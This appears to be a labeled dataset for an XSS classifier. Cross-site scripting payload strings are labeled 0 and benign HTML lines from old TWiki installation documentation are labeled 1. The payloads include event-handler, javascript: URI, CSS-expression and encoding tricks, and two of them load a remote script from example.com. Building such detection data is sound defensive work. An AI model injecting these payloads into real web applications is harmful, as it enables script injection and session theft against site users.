 ' onerror=alert(1);'	0
 ' onerror=alert`1`;'	0
 '; alert(1); //	0
 '; alert`1`; //	0
 ';\r\nalert(1);//	0
 ';\r\nalert`1`;//	0
 onerror=alert(1);	0
 onmousemove=alert(1); 	0
--><script>alert(1);</script>	0
--><script>alert`1`;</script>	0
;}alert(1);{&#39;	0
" /><frame src="javascript:alert(1);"></frameset>	0
" onerror=alert(1);"	0
" onerror=alert`1`;"	0
" onmousemove=alert(1); 	0
" onmousemove=alert(1);"	0
" onmousemove=alert`1`; 	0
" onmousemove=alert`1`;"	0
"; alert(1); //	0
"; alert`1`; //	0
";\r\nalert(1);//	0
";\r\nalert`1`;//	0
""" style="background:url(javascript:alert(1))" "	0
<img src=javascript:alert(1)>	0
"<s>"><img src="javascript:alert(1)">	0
"<s>"><script>alert(1)</script>	0
"></iframe><script>alert(1);</script>	0
"></iframe><script>alert`1`;</script>	0
"><frame src="javascript:alert(1)">	0
"><frame src="javascript:alert`1`">	0
"><script>alert(1);</script>	0
"><script>alert`1`;</script>	0
"onclick="alert(1)"	0
"onclick="alert`1`"	0
"onclick="alert(1)" "onFocus="alert(1)"	0
"onclick="alert`1`" "onFocus="alert`1`"	0
"onFocus="alert(1)"	0
"onFocusOut="alert(1)"	0
"onMouseDown="alert(1)"	0
"onMouseEnter="alert(1)"	0
"onMouseEnter="alert(1)" "onMouseDown="alert(1)"	0
"onMouseLeave="alert(1)"	0
"onMouseLeave="alert(1)" "onMouseOut="alert(1)"	0
"onMouseMove="alert(1)"	0
"onMouseMove="alert(1)" "onFocusOut="alert(1)"	0
"onMouseOut="alert(1)"	0
"onMouseUp="alert(1)"	0
"onMouseWheel="alert(1)"	0
"onMouseWheel="alert(1)" "onMouseUp="alert(1)"	0
”＞＜ｓｃｒｉｐｔ＞ａｌｅｒｔ（’ＸＳＳ’）＜／ｓｃｒｉｐｔ＞	0
*/\r\nalert(1);//	0
*/\r\nalert`1`;//	0
\r\nalert(1);//	0
\r\nalert`1`;//	0
<![CDATA["><script>alert(1)</script><!--]]>	0
</textarea><img src=x onerror=alert(1);>	0
</textarea><img src=x onerror=alert`1`;>	0
</textarea><script>alert(1);</script>	0
</textarea><script>alert`1`;</script>	0
<% onmousemove=alert(1)>	0
<% style="xss:expr/* */ession(alert(1))">	0
<% style="xss:expression(alert(1))">	0
<<script>alert(1);<</script>	0
<a onmouseover="alert(1)">XSS</a>	0
<a onmouseover=alert(1)>XSS</a>	0
<b <script>alert(1)</script>0	0
<b>aaaa<script<b></b><alert(1)</script </b>	0
<div style='behavior:url(test.sct)'>a</div>	0
<div style="color:expression(alert(1));">a</div>	0
<div style="left:exp/* */ression(alert(1))">	0
<div style="left:expression(alert(1))">	0
<div/style="width:expression(alert(1))">x</div>	0
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>	0
<iframe src="javascript:alert(1);"></iframe>	0
<iframe src="x" style=width:exp/**/ressi/**/on(alert(1))>	0
<iframe src=# onmouseover="alert(1)"></iframe>	0
<img src="http://www.example.com/>"onerror="alert(1)//<">	0
<img src=x onerror=alert(1);>	0
<img src=x onerror=alert`1`;>	0
<meta http-equiv="Content-Type" content="text/html; charset=UTF-7"/>+ADw-script+AD4-alert(1)+ADsAPA-/script+AD4-	0
<object data="data:text/html,<script>alert(1)</script>"></object>	0
<q/oncopy=alert(1)	0
<q/oncut=alert(1)	0
<s oncopy= alert(1)>a	0
<s oncut= alert(1)>a	0
<s><script>alert(1)</script>	0
<s>><img src="javascript:alert(1)>	0
<script src=http://example.com/xss.js></script>	0
<sCriPt src=http://example.com/xss.js></script>	0
<script>alert(1);</script>	0
<ScrIpt>alert(1);</SCript>	0
<script>alert`1`;</script>	0
<SELECT NAME="" onmouseover=alert(1)></select>	0
><s><img src="javascript:alert(1)>	0
a style=background:url(javascript:alert(1)) 	0
data:text/html,<script>alert(1)</script>	0
javascript:alert(1);	0
javascript:alert(1)//	0
javascript:alert`1`;	0
style=background:url(javascript(1))	0
<title>TWikiDocumentation</title>	1
</head><body bgcolor="#ffffff">	1
<h1><a name="Feb_2">(01 Feb 2003)</a></h1>	1
<script language="JavaScript" type="text/javascript">	1
<!-- TWiki -->	1
<strong><em>Doubleclick</em></strong>	1
<a href="#TWiki">TWiki System Requirements</a>	1
<a href="#Server_Requirements">Server Requirements</a>	1
<strong><em>Note:</em></strong><a href="" target="_top"></a>	1
<strong><em>Related Topics:</em></strong> <a href="http://TWiki.org">TWikiSite</a>	1
<h1><a name="TWiki_System_Requirements"> TWiki System Requirements </a></h1>	1
<em>Server and client requirements for TWiki 01-Feb-2003</em>	1
<h2><a name="Server_Requirements"> Server Requirements </a></h2>	1
<a href="http://www.gnu.org" target="_top">RCS</a>	1
<table border="1" cellspacing="0" cellpadding="1"> <tr><th colspan="3" bgcolor="#99CCCC"></th></tr>	1
<tr><th bgcolor="#99CCCC"> <strong>Resource</strong> </th><th bgcolor="#99CCCC">	1
<tr><td> Perl </td><td colspan="2" align="center"><br />	1
<tr><td></td><td align="center"> <code>Net::SMTP</code></td></tr>	1
<tr><td> RCS </td><td colspan="2" align="center"><br />	1
<tr><td> GNU <code>diff</code> </td><td colspan="2" align="center"> GNU <code>diff</code><br />	1
<tr><td></td><td colspan="2" align="center"> <code>ls, fgrep, egrep</code> </td></tr>	1
<tr><td></td><td align="center"> <code>cron</code> </td><td> <code>cron</code></td></tr>	1
<tr><td> Web server </td><td colspan="2" align="center"> Apache</td></tr>	1
<img src="http://TWiki.org" border="0" alt="ALERT!" width="16" height="16" />	1
<a name="ClientRequirements"></a>	1
<h2><a name="Client_Requirements"> Client Requirements </a></h2>	1
The TWiki <a href="http://TWiki.org">standard installation</a>	1
You can easily add functionality, by customizing <a href="http://TWiki.org">TWikiTemplates</a>	1
<h2><a name="Known_Issues"> Known Issues </a></h2>	1
-- <a href="http://TWiki.org/cgi-bin/">MikeMannix</a>	1
<h1><a name="TWiki_Installation_Guide"> TWiki Installation Guide </a></h1>	1
<em>Installation instructions for the TWiki 01-Feb-2003 production release. Update notes for the new RCS configuration are marked</em>	1
These installation steps are based on the <strong>Apache</strong> web server on <strong>Linux</strong>	1
<a name="StandardInstallation"></a>	1
<h2><a name="Standard_Installation"> Standard Installation </a></h2>	1
Request and download the TWiki<a href="http://TWiki.org/download.html" target="_top">http://TWiki.org/download.html</a>	1
<h3><a name="Step_1_Create_Configure_the_Dire"> Step 1: Create</a></h3>	1
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/warning.gif" border="0" alt="ALERT!" width="16" height="16" />	1
<br /> <img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/warning.gif" border="0" alt="ALERT!" width="16" height="16" />	1
<blockquote style="background-color:#F5F5F5">	1
<strong>Example <code>httpd.conf</code> entries:</strong>	1
<pre> ScriptAlias /twiki/bin/ "/home/httpd/twiki/bin/"	1
&lt;/Directory&gt;</pre>	1
<em>Go directly to <a href="#StepTwo">Step 2</a>...</em>	1
<a name="StepOneB"></a>	1
<h4><a name="Step_1_for_Non_Root_Accounts"> Step 1 for Non-Root Accounts </a></h4>	1
<table border="1" cellspacing="0" cellpadding="1"> <tr><th bgcolor="#99CCCC"> <strong>TWiki dir:</strong> </th><th bgcolor="#99CCCC">	1
<tr><td> <code>twiki</code> </td><td> start-up pages </td><td> root TWiki dir </td><td> <code>/home/smith/twiki/</code> </td></tr>	1
<tr><td> <code>twiki/bin</code> </td><td> CGI bin </td><td> CGI-enabled dir </td><td> <code>/home/smith/twiki/bin</code> </td></tr>	1
<tr><td> <code>twiki/lib</code> </td><td> library files </td><td> same level as <code>twiki/bin</code> </td><td> <code>/home/smith/twiki/lib</code> </td></tr>	1
<tr><td> <code>twiki/pub</code> </td><td> public files </td><td> htdoc enabled dir </td><td> <code>/home/smith/twiki/pub</code> </td></tr>	1
<tr><td> <code>twiki/data</code> </td><td> topic data </td><td> dir secure from public access </td><td> <code>/home/smith/twiki/data</code> </td></tr>	1
<tr><td> <code>twiki/templates</code> </td><td> web templates </td><td> dir secure from public access </td><td> <code>/home/smith/twiki/templates</code> </td></tr>	1
If you are not able to create the <code>twiki/lib</code> directory at the same level as the <code>twiki/bin</code>	1
twikiLibPath = <font color="red">'/some/other/path/lib'</font>; # Path to lib directory containing TWiki.pm	1
You can also edit <code>localPerlLibPath</code> in the <code>setlib.cfg</code>	1
<a name="StepTwo"></a>	1
<h3><a name="Step_2_Set_File_Permissions"> Step 2: Set File Permissions </a></h3>	1
<strong>IMPORTANT:</strong> On ISP-hosted accounts, Perl CGI scripts usually require a <code>.cgi</code>	1
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/help.gif" border="0" alt="HELP" width="16" height="16" />	1
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/tip.gif" border="0" alt="TIP" width="16" height="16" />	1
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/help.gif" border="0" alt="HELP" width="16" height="16" />	1
<h3><a name="Step_3_Set_the_Main_Configuratio"> Step 3: Set the Main Configuration File </a></h3>	1
<strong>Security issue:</strong> Directories <code>twiki/data</code> , <code>twiki/templates</code>	1
<h3><a name="Step_4_Configure_Site_Wide_Email"> Step 4: Configure Site-Wide Email Preferences </a></h3>	1
<code>WIKIWEBMASTER</code> should be set to the email address of the TWiki administrator	1
<code>SMTPMAILHOST</code> is typically set on Windows or other non-Unix/Linux systems, where <code>sendmail</code>	1
<code>SMTPSENDERHOST</code> is optional, and set to the domain name sending the email (e.g. <code>twiki.yourdomain.com</code>).	1
<h3><a name="Step_5_Finish_Up_from_Your_Brows"> Step 5: Finish Up from Your Browser </a></h3>	1
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/tip.gif" border="0" alt="TIP" width="16" height="16" />	1
<h2><a name="Additional_Server_Level_Options"> Additional Server-Level Options </a></h2>	1
<a name="AuthenticationOfUsers"></a>	1
<h3><a name="Enabling_Authentication_of_Users"> Enabling Authentication of Users </a></h3>	1
<strong>Rename</strong> file <code>.htaccess.txt</code> in the <code>twiki/bin</code> directory to <code>.htaccess</code>	1
<code>Redirect <font color="red">/urlpathto/twiki/index.html</font> http://<font color="red">yourdomain.com/urlpathto/twiki/bin/</font>view</code> <br>	1
<code>AuthUserFile <font color="red">/filepathto/twiki/data/</font>.htpasswd</code> <br />	1
<code>ErrorDocument 401 <font color="red">/urlpathto/twiki/bin/</font>oops/TWiki/TWiki</code>	1
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/warning.gif" border="0" alt="ALERT!" width="16" height="16" />	1
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/help.gif" border="0" alt="HELP" width="16" height="16" />	1
<strong>This applies only if you have root access:</strong> on hosted accounts, you shouldn't have this problem - otherwise, email tech support.	1
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/warning.gif" border="0" alt="ALERT!" width="16" height="16" />	1
<strong>Copy</strong> the <a href="http://TWiki.org/cgi-bin/view/TWiki/TWikiRegistrationPub">TWikiRegistrationPub</a>	1
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/warning.gif" border="0" alt="ALERT!" width="16" height="16" />	1
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/warning.gif" border="0" alt="ALERT!" width="16" height="16" />	1
<h2><a name="TWiki_File_System_Info"> TWiki File System Info </a></h2>	1
See <a href="http://TWiki.org/cgi-bin/view/TWiki/AppendixFileSystem">Appendix A: TWiki File System</a>	1
-- <a href="http://TWiki.org/cgi-bin/view/TWiki/PeterThoeny">PeterThoeny</a> - 28 Dec 2002 <br />	1
-- <a href="http://TWiki.org/cgi-bin/view/Main/MikeMannix">MikeMannix</a> - 16 May 2002	1
<h1><a name="Windows_Install_Cookbook"> Windows Install Cookbook </a></h1>	1
<h2><a name="Introduction"> Introduction </a></h2>	1
This cookbook is intended to get you up and running with TWiki on Windows quickly, with as few problems as possible. The 'cookbook' approach is simply to restrict the many choices that someone installing	1
TWiki must make, so that a reasonably well-defined procedure can be followed - new users can simply follow the steps, while experts can use this as more of a guideline. Please read	1
<a href="http://twiki.org/cgi-bin/view/Codev.WindowsModPerlInstallCookbook" title="'Codev.WindowsModPerlInstallCookbook' on TWiki site, we know it!">TWiki:Codev.WindowsModPerlInstallCookbook</a> in case you use mod_perl.	1
-- <a href="http://TWiki.org/cgi-bin/view/Main/RichardDonkin">RichardDonkin</a> - 24 Feb 2002	1
<h2><a name="Recent_updates"> Recent updates </a></h2>	1
30 Nov 2002 - added <code>binutils</code> to list of Cygwin packages, and added warning not to use Apache 2.0	1
20 Nov 2002 - update to avoid <a href="http://twiki.org/cgi-bin/view/Support.InstallDigestSHA1Fails" title="'Support.InstallDigestSHA1Fails' on TWiki site, we know it!">SHA1Fails</a>	1
12 Nov 2002 - setting <code>SMTPMAILHOST</code> for user registration and notification	1
03 Sep 2002 - linked to <a href="http://twiki.org/cgi-bin/view/Codev.WindowsModPerlInstallCookbook" title="'Codev.WindowsModPerlInstallCookbook' on TWiki site, we know it!">Codev</a>	1
20 Jul 2002 - added flags to <code>grep</code> commands in <code>TWiki.cfg</code>	1
20 Jun 2002 - added creation of <code>c:/twiki</code> directory	1
15 Jun 2002 - various notes on Cygwin installation and troubleshooting: use of 'Unix' as default text file type (i.e. for mounting <code>c:/cygwin</code> directories) is essential for binary attachment uploads to work properly	1
<code>egrep</code> and <code>fgrep</code> on some Cygwin versions (fix from <a href="http://twiki.org/cgi-bin/view/Main.DavidLeBlanc" title="'Main.DavidLeBlanc' on TWiki site, we know it!">TWiki</a>)	1
21 Apr 2002 - updates on download sizes and free disk space requirements, improved post-installation <a href="#Testing_your_TWiki_installation">testing</a>	1
<a href="http://twiki.org/cgi-bin/" title="'Main.MaryDeMarco' on TWiki site, we know it!">TWiki:MaryDeMarco</a>	1
<code>pcre</code> to list of Cygwin packages (required by <code>grep</code>)	1
<a href="http://twiki.org/cgi-bin/view/Codev.TWikiAlphaRelease" title="'Codev.TWikiAlphaRelease' on TWiki site, we know it!">TWiki:Codev.TWikiAlphaRelease</a>	1
3 Mar 2002 - minor update to include <code>uname -a</code> command to check Cygwin DLL version, and delete Apache config's PassEnv line	1
<a href="http://twiki.org/cgi-bin/view/Codev.WindowsInstallCookbookComments" title="'Codev.WindowsInstallCookbookComments' on TWiki site, we know it!">TWiki:Codev.WindowsInstallCookbookComments</a>	1
<code>register</code>, fixed minor typo in Cygwin binary mode section, after beta testing by	1
<h2><a name="Scope"> Scope </a></h2>	1
<table border="1" cellspacing="0" cellpadding="1"> <tr><th bgcolor="#99CCCC"> <strong>Component</strong> </th><th bgcolor="#99CCCC">	1
<tr><td> Operating System </td><td> Windows 2000 </td><td> Should also work for Windows NT </td></tr>	1
<tr><td> Web Server </td><td><a href="http://httpd.apache.org" target="_top">http://httpd.apache.org</a>, but <strong>don't</strong> use Apache 2.0 yet) </td></tr>	1
<tr><td> Unix tools </td><td> Cygwin 1.3.9 </td><td> Simplest way to get a whole set of required tools </td></tr>	1
<tr><td> Perl </td><td> Cygwin perl-5.6.1-2 </td><td> Comes with Cygwin </td></tr>	1
<tr><td> RCS </td><td> Cygwin rcs-5.7-2 </td><td> Comes with Cygwin, includes a file corruption bugfix </td></tr>	1
